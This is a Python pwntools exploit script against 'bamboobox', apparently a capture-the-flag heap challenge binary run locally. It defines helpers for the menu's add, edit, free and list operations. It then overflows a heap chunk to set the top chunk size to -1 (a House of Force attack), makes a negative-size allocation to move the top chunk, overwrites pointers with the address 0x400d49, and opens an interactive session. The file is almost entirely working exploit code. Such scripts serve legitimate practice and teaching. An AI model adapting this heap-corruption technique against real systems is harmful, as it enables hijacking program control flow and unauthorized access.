from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./bamboobox"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Please enter the length of item name:",str(length))
    p.sendlineafter("Please enter the name of item:",str(content))

def list():
    opt(1)

def free(idx):
    opt(4)
    p.sendlineafter("Please enter the index of item:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Please enter the index of item:",str(idx))
    p.sendlineafter("Please enter the length of item name:",str(length))
    p.sendlineafter("Please enter the new name of the item:",str(content))

add(0x30,"a"*0x10)

payload = flat([
    0,0xffffffffffffffff
    ])

edit(0,0x40,"b"*0x30+payload)
add(-0x70,"aabb")
add(0x20,p64(0x400d49)*2)
p.sendline("5")
# gdb.attach(p,"set $h=0x603000,$g=0x6020c0")

p.interactive()
